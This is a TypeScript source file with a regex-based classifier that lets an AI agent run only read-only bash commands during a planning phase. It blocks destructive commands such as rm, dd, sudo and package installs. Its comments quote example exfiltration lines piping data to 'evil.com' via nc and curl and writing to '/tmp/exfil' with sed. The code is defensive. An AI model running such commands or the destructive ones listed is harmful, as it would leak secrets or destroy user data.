/**
 * Bash safety classifier shared by extensions that need read-only plan phases.
 * Originally lived in develop/plan-utils.ts; extracted here so `modes` can
 * import it without depending on develop.
 */

// ---- Bash safety classifier -----------------------------------------------
//
// Extensions that restrict the agent to read-only exploration still allow
// `bash` for useful commands (`rg`, `jq`, `git log`, etc.). The `tool_call`
// handler uses `isSafeCommand` to block the destructive majority while
// letting read-only exploration through.

const DESTRUCTIVE_PATTERNS: readonly RegExp[] = [
	/\brm\b/i,
	/\brmdir\b/i,
	/\bmv\b/i,
	/\bcp\b/i,
	/\bmkdir\b/i,
	/\btouch\b/i,
	/\bchmod\b/i,
	/\bchown\b/i,
	/\bchgrp\b/i,
	/\bln\b/i,
	/\btee\b/i,
	/\btruncate\b/i,
	/\bdd\b/i,
	/\bshred\b/i,
	// Output redirection — blocks writes to any file.
	/(^|[^<])>(?!>)/,
	/>>/,
	/\bnpm\s+(install|uninstall|update|ci|link|publish)/i,
	/\byarn\s+(add|remove|install|publish)/i,
	/\bpnpm\s+(add|remove|install|publish)/i,
	/\bpip\s+(install|uninstall)/i,
	/\bapt(-get)?\s+(install|remove|purge|update|upgrade)/i,
	/\bbrew\s+(install|uninstall|upgrade)/i,
	// Git write operations — plan phase must not mutate the repo.
	/\bgit\s+(add|commit|push|pull|merge|rebase|reset|checkout|branch\s+-[dD]|stash|cherry-pick|revert|tag|init|clone)/i,
	/\bsudo\b/i,
	/\bsu\b/i,
	/\bkill\b/i,
	/\bpkill\b/i,
	/\bkillall\b/i,
	/\breboot\b/i,
	/\bshutdown\b/i,
	/\bsystemctl\s+(start|stop|restart|enable|disable)/i,
	/\bservice\s+\S+\s+(start|stop|restart)/i,
	/\b(vim?|nano|emacs|code|subl)\b/i,
];

const SAFE_PATTERNS: readonly RegExp[] = [
	/^\s*cat\b/,
	/^\s*head\b/,
	/^\s*tail\b/,
	/^\s*less\b/,
	/^\s*more\b/,
	/^\s*grep\b/,
	/^\s*find\b/,
	/^\s*ls\b/,
	/^\s*pwd\b/,
	/^\s*echo\b/,
	/^\s*printf\b/,
	/^\s*wc\b/,
	/^\s*sort\b/,
	/^\s*uniq\b/,
	/^\s*diff\b/,
	/^\s*file\b/,
	/^\s*stat\b/,
	/^\s*du\b/,
	/^\s*df\b/,
	/^\s*tree\b/,
	/^\s*which\b/,
	/^\s*whereis\b/,
	/^\s*type\b/,
	// env/printenv omitted — exposes full process environment including API keys.
	/^\s*uname\b/,
	/^\s*whoami\b/,
	/^\s*id\b/,
	/^\s*date\b/,
	/^\s*cal\b/,
	/^\s*uptime\b/,
	/^\s*ps\b/,
	/^\s*top\b/,
	/^\s*htop\b/,
	/^\s*free\b/,
	// git config omitted — repo/global configs may contain inline tokens.
	/^\s*git\s+(status|log|diff|show|branch|remote)/i,
	/^\s*git\s+ls-/i,
	/^\s*npm\s+(list|ls|view|info|search|outdated|audit)/i,
	/^\s*yarn\s+(list|info|why|audit)/i,
	/^\s*node\s+--version/i,
	/^\s*python\s+--version/i,
	/^\s*jq\b/,
	// sed -n removed — supports file writes via the 'w' flag (sed -n 'w /tmp/exfil' file).
	// awk removed — supports system(), print > "file", and piped output.
	/^\s*rg\b/,
	/^\s*fd\b/,
	/^\s*bat\b/,
	/^\s*eza\b/,
];

/**
 * Returns `true` iff every sub-command in `command` matches at least one safe
 * pattern and no destructive pattern.
 *
 * Splits on `|`, `||`, `&&`, and `;` before classification so a safe-prefixed
 * command cannot bypass the classifier via `cat file | nc evil.com` or
 * `git log && curl evil.com`.
 *
 * Remaining limitation: shell features like process substitution `$()`,
 * backtick execution, and here-documents are not parsed; callers should treat
 * this as a defence-in-depth heuristic rather than a security boundary.
 */
export function isSafeCommand(command: string): boolean {
	const parts = command.split(/\|{1,2}|&&|;/);
	return parts.every((part) => isSafeSubcommand(part.trim()));
}

function isSafeSubcommand(command: string): boolean {
	if (!command) return true; // empty fragment (e.g. trailing semicolon)
	const isDestructive = DESTRUCTIVE_PATTERNS.some((p) => p.test(command));
	if (isDestructive) return false;
	return SAFE_PATTERNS.some((p) => p.test(command));
}
